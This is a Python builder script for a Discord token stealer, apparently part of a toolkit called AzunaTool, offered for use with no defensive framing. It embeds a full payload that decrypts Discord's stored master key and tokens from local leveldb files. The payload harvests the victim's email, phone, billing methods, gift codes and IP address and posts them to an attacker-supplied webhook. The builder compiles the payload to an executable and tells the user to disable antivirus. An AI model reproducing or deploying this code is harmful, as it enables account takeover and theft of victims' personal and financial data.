import os
import datetime
import requests
import time
import subprocess
import tkinter as tk
from tkinter import messagebox
import shutil
from colorama import *

def check_webhook(webhook_url):
    response = requests.get(webhook_url)
    
    if response.status_code == 200:
        return True
    elif response.status_code == 404:
        print(f"{Fore.RED}Invalid webhook URL. Please enter a valid one.{Style.RESET_ALL}")
        time.sleep(1)
        return False
    else:
        print(f"{Fore.RED}Error verifying webhook. Please try again.{Style.RESET_ALL}")
        time.sleep(1)
        return False

webhook = input(f"{Fore.BLUE}Webhook URL :{Style.RESET_ALL} ")
while not check_webhook(webhook):
    webhook = input(f"{Fore.BLUE}Webhook URL :{Style.RESET_ALL} ")

namefile = input(f"{Fore.BLUE}Name of File:{Style.RESET_ALL} ")
print(f"\n{Fore.BLUE}File Type:{Style.RESET_ALL}")
print(f"{Fore.BLUE}┌─ [{Style.RESET_ALL}01{Fore.BLUE}]{Style.RESET_ALL} Python File")
print(f"{Fore.BLUE}├─ [{Style.RESET_ALL}02{Fore.BLUE}]{Style.RESET_ALL} Executable File")

def get_file_type():
    file_type_choice = input(f"{Fore.BLUE}└───>{Style.RESET_ALL} ").strip()
    while file_type_choice not in ["1", "01", "2", "02"]:
        print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
        time.sleep(1)
        return False  
    return file_type_choice 

file_type_choice = get_file_type()
if not file_type_choice:
    print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
    time.sleep(1)
    exit()    

is_executable = file_type_choice in ["2", "02"]
file_extension = ".exe" if is_executable else ".py"

folder_path = "FileCreate/TokenGrab"
os.makedirs(folder_path, exist_ok=True)
file_path = os.path.join(folder_path, f"{namefile}{file_extension}")

tokengrab = '''#Create with AzunaTool
import os
import json
import socket
import getpass
from datetime import *
import base64
import requests
import sqlite3
import win32crypt
from Crypto.Cipher import AES

def get_system_info():
    pc_user = getpass.getuser()  
    local_ip = requests.get("https://api.ipify.org").text
    return pc_user, local_ip

pc_user, local_ip = get_system_info()

def get_master_key():
    try:
        path = os.path.join(os.getenv("APPDATA"), "discord", "Local State")
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return None

def get_token():
    db_path = os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb")
    master_key = get_master_key()
    tokens = []
    
    if not master_key:
        return []
    
    for file_name in os.listdir(db_path):
        if file_name.endswith(".ldb") or file_name.endswith(".log"):
            with open(os.path.join(db_path, file_name), "r", errors="ignore") as file:
                for line in file.readlines():
                    if "dQw4w9WgXcQ" in line:
                        try:
                            token_encrypted = base64.b64decode(line.split("dQw4w9WgXcQ")[1].split('"')[0])
                            token = decrypt_value(token_encrypted, master_key)
                            if token and token not in tokens:
                                tokens.append(token)
                        except:
                            pass
    
    return tokens

status_mapping = {
    "online": "Online",
    "idle": "Absent",
    "dnd": "Do not disturb",
    "offline": "Offline / Invisible"
}

def get_discord_status(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.get("https://discord.com/api/v9/users/@me/settings", headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        status = data.get("status", "unknown")
        return status_mapping.get(status, "Unknow") 
    return "Error"

def create(id):
    timestamp = ((int(id) >> 22) + 1420070400000) / 1000
    return datetime.fromtimestamp(timestamp, timezone.utc).strftime('Date: %m/%d/%Y Hour: %H:%M:%S')

def billing(token):
    url = "https://discord.com/api/v9/users/@me/billing/payment-sources"
    headers = {"Authorization": token}

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        payment_sources = response.json()
        methods = []

        for source in payment_sources:
            if source["type"] == 1:  
                brand = source.get("brand", "Unknow").capitalize()
                methods.append(f"CB ({brand})")  
            elif source["type"] == 2: 
                methods.append("PayPal")
            else:
                methods.append("Other unknown method")

        return ", ".join(methods) if methods else "No payment method"
    else:
        return "Unable to recover payments"

def get_gift_codes(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    gift_response = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
    
    if gift_response.status_code == 200:
        gift_data = gift_response.json()
        if gift_data:
            return " ".join([f"Gift: {gift['promotion']['outbound_title']} Code: {gift['code']}" for gift in gift_data])
        else:
            return "No gift code"
    return "Unable to get codes"

def get_discord_info(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    user_response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    
    if user_response.status_code != 200:
        return None
    
    user_data = user_response.json()
    gift_codes = get_gift_codes(token)
    status = get_discord_status(token)
    created_a = create(user_data.get("id", "0"))

    return {
        "username": user_data.get("username", "Unknow"),
        "display_name": user_data.get("global_name", "None"),
        "avatar": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.{'gif' if user_data['avatar'].startswith('a_') else 'png'}" if user_data.get("avatar") else None,
        "mfa_enabled": "True" if user_data.get("mfa_enabled", False) else "False",
        "email": user_data.get("email", "None"),
        "phone": user_data.get("phone", "None"),
        "locale": user_data.get("locale", "None"),
        "nitro": "Nitro Classic" if user_data.get("premium_type") == 1 else ("Nitro Boost" if user_data.get("premium_type") == 2 else "None"),
        "gift_codes": gift_codes,
        "billing": billing(token),
        "user_id": user_data.get("id", "ID not found"),
        "status": status,
        "creation_date": create(user_data.get("id", "0")),
    }

WEBHOOK_URL = "$webhook"

tokens = get_token()
if tokens:
    for token in tokens:
        user_info = get_discord_info(token)
        if user_info:
            embed = {
                "title": "🔐 Discord Token Grabbed.",
                "description": f"**Token of `{pc_user} | {local_ip}`:**",
                "color": 3447003,
                "fields": [
                    {"name": "👤 Username", "value": f"```{user_info['username']}```", "inline": True},
                    {"name": "👤 Display Name", "value": f"```{user_info['display_name']}```", "inline": True},
                    {"name": "🆔 User ID", "value": f"```{user_info['user_id']}```", "inline": True},
                    {"name": "📅 Account Created", "value": f"```{user_info['creation_date']}```", "inline": True},
                    {"name": "🔒 Multi-Factor Auth", "value": f"```{user_info['mfa_enabled']}```", "inline": True},
                    {"name": "📧 Email", "value": f"```{user_info['email']}```", "inline": True},
                    {"name": "📞 Phone", "value": f"```{user_info['phone']}```", "inline": True},
                    {"name": "🌍 Language", "value": f"```{user_info['locale']}```", "inline": True},
                    {"name": "🚀 Nitro", "value": f"```{user_info['nitro']}```", "inline": True},
                    {"name": "💰 Billing", "value": f"```{user_info['billing']}```", "inline": True},
                    {"name": "📡 Status", "value": f"```{user_info['status']}```", "inline": True},
                    {"name": "🔑 Token", "value": f"```{token}```", "inline": True},
                    {"name": "🎁 Gift Code", "value": f"```{user_info['gift_codes']}```", "inline": True},
                    {"name": "📁 Path", "value": f"```{os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb')}```", "inline": True},
                    {"name": "🖼️ Profile Picture", "value": "", "inline": False}
                ],
                "image": {
                    "url": user_info['avatar'] if user_info.get('avatar') else 'https://example.com/default_avatar.png'
                },
                "footer": {
                    "text": "Token Grabber | By AzunaTool"
                },
                "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
            }
            requests.post(WEBHOOK_URL, json={"embeds": [embed]})

os._exit(0)'''

tokengrab = tokengrab.replace("$webhook", webhook)

with open(file_path, "w", encoding="utf-8") as f:
    f.write(tokengrab)

def show_info_popup():
    root = tk.Tk()
    root.withdraw() 

    root.iconbitmap("Image/AzunaTool-Icone.ico")

    messagebox.showinfo(
        "AzunaTool Information",
        "Please remove or disable your AV while creating the stealer.",
        icon='warning'  
    )

if is_executable:
    show_info_popup()

    print(f"\n{Fore.BLUE}Preparing to create the file... {Style.RESET_ALL}| ", end="")
    for i in range(10):
        time.sleep(0.2)
        print(f"#", end="", flush=True)
    print(f" {Fore.GREEN}[DONE]{Style.RESET_ALL}")
    os.system(f"pyinstaller --onefile {file_path}")
    os.remove(file_path)  
    file_path = os.path.join("dist", f"{namefile}.exe")
    os.rename(file_path, os.path.join(folder_path, f"{namefile}.exe"))
    os.system("rmdir /s /q build")
    os.system("del /q *.spec")
    os.system("rmdir /s /q dist")
    file_path = os.path.join(folder_path, f"{namefile}.exe")
    print(f"{Fore.GREEN}The executable file has been created successfully.")
    
print(f"{Fore.GREEN}Script generated successfully in:{Style.RESET_ALL} {file_path}")

def send_webhook_notification(filename, path):
    timestamp = datetime.datetime.utcnow().isoformat()  
    file_type = "Executable File" if is_executable else "Python File"

    embed = {
        "title": "📂 Token Grabber File Created",
        "description": "**The file was successfully created.**",
        "color": 3447003, 
        "fields": [
            {"name": "🕒 Creation Time:", "value": f"```{datetime.datetime.now().strftime('Date: %d/%m/%Y\nHour: %H:%M:%S')}```", "inline": True},
            {"name": "📂 Name File:", "value": f"```{filename}{file_extension}```", "inline": True},
            {"name": "📂 File Type:", "value": f"```{file_type}```", "inline": True},
            {"name": "📍 Path:", "value": f"```{os.path.abspath(path)}```", "inline": False}
        ],
        "footer": {
            "text": "Token Grabber Create | By AzunaTool"
        },
        "timestamp": timestamp
    }
    
    data = {"embeds": [embed]}
    
    try:
        requests.post(webhook, json=data)  
    except:
        pass  

send_webhook_notification(namefile, file_path)